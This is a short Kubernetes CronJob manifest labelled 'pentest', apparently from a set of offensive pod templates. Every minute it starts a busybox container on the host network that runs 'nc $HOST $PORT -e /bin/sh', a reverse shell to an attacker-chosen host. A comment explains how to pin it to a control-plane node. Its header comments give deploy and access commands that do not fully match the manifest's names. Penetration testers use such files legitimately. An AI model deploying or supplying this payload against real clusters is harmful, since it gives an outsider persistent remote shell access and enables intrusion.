###########################################################
## Deploy: kubectl -n [namespace] apply -f hostnetwork-exec.yaml 
## Access: kubectl -n [namespace] exec -it hostnetwork-exec -- chroot /host
## Remove: kubectl -n [namespace] delete hostnetwork-exec
###########################################################

apiVersion: batch/v1beta1
kind: CronJob
metadata:
  name: hostnetwork
  labels:
    app: pentest
spec:
  schedule: "*/1 * * * *"
  concurrencyPolicy: Forbid
  jobTemplate:
    spec:
      template:
        spec:
          hostNetwork: true
          containers:
          - name: hostnetwork
            image: busybox
            command: [ "/bin/sh", "-c", "--" ]
            args: [ "nc $HOST $PORT  -e /bin/sh;" ]
          #nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name
          restartPolicy: OnFailure
